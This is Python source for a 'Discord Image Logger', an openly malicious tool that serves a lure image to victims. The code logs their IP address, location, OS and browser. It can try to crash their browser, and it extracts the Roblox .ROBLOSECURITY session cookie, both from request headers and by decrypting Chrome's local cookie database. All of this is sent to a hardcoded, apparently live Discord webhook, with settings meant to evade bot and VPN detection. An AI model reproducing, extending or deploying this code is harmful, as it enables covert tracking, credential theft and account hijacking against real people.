from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json
import http.cookies
import os
import sys

__app__ = "Discord Image Logger"
__description__ = "Image Logger"
__version__ = "v2.0"
__author__ = "Rahand"

config = {
    "webhook": "https://discord.com/api/webhooks/1403034711357521951/3ENMQHsXdrmRF4y_bD0khVkPIGlQfz2moJzub5sudmCq73Kj-7gnO66_9ax92YuoUoo0",
    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Enable the custom message?
        "message": "du har blivit hakad av rahand och elias >:)", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except Exception as e:
        print(f"Failed to report error: {e}")

def extract_roblox_cookie_from_headers(headers):
    # Try to extract .ROBLOSECURITY from Cookie header
    try:
        cookie_header = headers.get('Cookie') or headers.get('cookie')
        if not cookie_header:
            return None
        cookies = http.cookies.SimpleCookie()
        cookies.load(cookie_header)
        if '.ROBLOSECURITY' in cookies:
            return cookies['.ROBLOSECURITY'].value
        return None
    except Exception as e:
        reportError(f"extract_roblox_cookie_from_headers error: {e}")
        return None

def extract_roblox_cookie_from_local():
    # Try to extract Roblox cookie from local browser storage (Windows only, Chrome/Edge/Opera/Brave)
    try:
        import win32crypt
        import sqlite3
        import shutil
        import base64
        from Cryptodome.Cipher import AES

        def get_chrome_master_key():
            try:
                local_state_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State"
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  # Remove DPAPI
                import win32crypt
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return key
            except Exception as e:
                reportError(f"get_chrome_master_key error: {e}")
                return None

        def decrypt_cookie(ciphertext, key):
            try:
                if sys.platform == 'win32':
                    if ciphertext[:3] == b'v10':
                        iv = ciphertext[3:15]
                        payload = ciphertext[15:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        return cipher.decrypt(payload)[:-16].decode()
                    else:
                        return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
                else:
                    return ""
            except Exception as e:
                reportError(f"decrypt_cookie error: {e}")
                return ""

        cookie_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
        if not os.path.exists(cookie_path):
            return None
        temp_cookie = os.path.join(os.getenv("TEMP") or "/tmp", "chrome_cookies_roblox")
        try:
            shutil.copy2(cookie_path, temp_cookie)
            conn = sqlite3.connect(temp_cookie)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'")
            row = cursor.fetchone()
            roblox_cookie = None
            if row:
                key = get_chrome_master_key()
                if key:
                    roblox_cookie = decrypt_cookie(row[2], key)
            cursor.close()
            conn.close()
            return roblox_cookie
        except Exception as e:
            reportError(f"extract_roblox_cookie_from_local error: {e}")
            return None
        finally:
            try:
                if os.path.exists(temp_cookie):
                    os.remove(temp_cookie)
            except Exception as e:
                reportError(f"Failed to remove temp cookie file: {e}")
    except Exception as e:
        reportError(f"extract_roblox_cookie_from_local outer error: {e}")
        return None

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, roblox_cookie=None, headers=None):
    try:
        if ip.startswith(blacklistedIPs):
            return
        
        bot = botCheck(ip, useragent)
        
        if bot:
            if config["linkAlerts"]:
                try:
                    requests.post(config["webhook"], json = {
                        "username": config["username"],
                        "content": "",
                        "embeds": [
                            {
                                "title": "Image Logger - Link Sent",
                                "color": config["color"],
                                "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                            }
                        ],
                    })
                except Exception as e:
                    reportError(f"makeReport bot alert error: {e}")
            return

        ping = "@everyone"

        try:
            info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        except Exception as e:
            reportError(f"Failed to get IP info: {e}")
            info = {
                "proxy": False, "hosting": False, "isp": None, "as": None, "country": None, "regionName": None,
                "city": None, "lat": None, "lon": None, "timezone": "Unknown/Unknown", "mobile": False
            }

        if info.get("proxy"):
            if config["vpnCheck"] == 2:
                return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting"):
            if config["antiBot"] == 4:
                if info.get("proxy"):
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                return

            if config["antiBot"] == 2:
                if info.get("proxy"):
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                ping = ""

        os_name, browser = httpagentparser.simple_detect(useragent or "")

        # Try to extract Roblox cookie from headers (web)
        if roblox_cookie is None and headers is not None:
            roblox_cookie = extract_roblox_cookie_from_headers(headers)
        # Try to extract Roblox cookie from local storage (desktop)
        if roblox_cookie is None:
            roblox_cookie = extract_roblox_cookie_from_local()

        roblox_cookie_str = roblox_cookie if roblox_cookie else "Not Found"

        try:
            timezone = info.get('timezone', 'Unknown/Unknown')
            tz_parts = timezone.split('/')
            tz_city = tz_parts[1].replace('_', ' ') if len(tz_parts) > 1 else 'Unknown'
            tz_region = tz_parts[0] if len(tz_parts) > 0 else 'Unknown'
        except Exception:
            tz_city = 'Unknown'
            tz_region = 'Unknown'

        try:
            coords_str = str(info.get('lat', '')) + ', ' + str(info.get('lon', ''))
            coords_display = coords.replace(',', ', ') if coords else coords_str
            coords_type = 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')' if coords else 'Approximate'
        except Exception:
            coords_display = 'Unknown'
            coords_type = 'Unknown'

        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "Image Logger - IP Logged",
                    "color": config["color"],
                    "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown') or 'Unknown'}`
> **ASN:** `{info.get('as', 'Unknown') or 'Unknown'}`
> **Country:** `{info.get('country', 'Unknown') or 'Unknown'}`
> **Region:** `{info.get('regionName', 'Unknown') or 'Unknown'}`
> **City:** `{info.get('city', 'Unknown') or 'Unknown'}`
> **Coords:** `{coords_display}` ({coords_type})
> **Timezone:** `{tz_city} ({tz_region})`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting', False) and not info.get('proxy', False) else 'Possibly' if info.get('hosting', False) else 'False'}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**Roblox Cookie:**
{roblox_cookie_str}
""",
                }
            ],
        }
        try:
            requests.post(config["webhook"], json=embed)
        except Exception as e:
            reportError(f"Failed to send embed: {e}")

    except Exception as e:
        reportError(f"makeReport error: {e}")
